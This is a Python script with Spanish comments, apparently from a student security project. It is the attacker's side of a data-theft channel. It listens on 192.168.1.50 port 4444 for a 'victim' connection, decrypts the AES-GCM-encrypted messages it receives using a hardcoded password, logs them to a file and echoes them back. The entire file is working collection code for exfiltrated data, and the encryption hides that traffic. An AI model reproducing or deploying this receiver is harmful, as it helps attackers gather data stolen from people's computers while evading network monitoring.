# Libreria necesaria para codificar y descodificar
from base64 import b64encode, b64decode
# Libreria utilizada para generar la clave secreta 
import hashlib
# Libreria para encriptar el mensaje con AES
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
#Libraria para generar la conexión con el atacante
import socket
# Libraria usada para codificar y descodificar
import json


# Funcion que desencripta dado un diccionario codificado y una contraseña
def desencriptar(enc_dict, password):
    # decodifica el diccionario en base 64 
    salt = b64decode(enc_dict['salt'])
    textoCifrado = b64decode(enc_dict['textoCifrado'])
    nonce = b64decode(enc_dict['nonce'])
    etiqueta = b64decode(enc_dict['etiqueta'])
    

    # genera la clave privada con la contrasena dada y el salt decodificado
    private_key = hashlib.scrypt(
        password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)

    # crear la configuración del cifrado AES-256, con los datos decodificados
    cifrado = AES.new(private_key, AES.MODE_GCM, nonce=nonce)

    # desencripta el texto cifrado con la configuración creada
    decrypted = cifrado.decrypt_and_verify(textoCifrado, etiqueta)
    #Retorna el texto desencriptado
    return decrypted

def escribirEnArchivoLog(mensaje):
    file = open("log.log", "a")

    file.write('mensaje: {!r}\n'.format(mensaje))

    file.close()





# Crea el socket TCP/IP 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# configura el socket del atacante 
direccionServidor = ('192.168.1.50', 4444)
print('Incia la conexión {} por el puerto {}'.format(*direccionServidor))
sock.bind(direccionServidor)
sock.listen(1)

while True:
    print('Esperando conexión')
    conexion, direccionVictima = sock.accept()
    try:
        print('Cliente conectado:', direccionVictima)
        while True:
            try:
                data = conexion.recv(4096)
                #print('mensaje {!r}'.format(decrypt(data)))
                print('mensaje encriptado {!r}'.format(data))

                try:
                    mensajeDesencriptado = desencriptar(json.loads(data), "ProyectoSeguridad");
                    escribirEnArchivoLog(mensajeDesencriptado)
                    print('mensaje {!r}'.format(mensajeDesencriptado))

                except:
                    print("Clave erronea")
                
                if data:
                    conexion.sendall(data)
                else:
                    #print("Conexion perdida")

                    break
            except:
                break
                
    finally:
        print("Conexion perdida")
       # conexion.close()
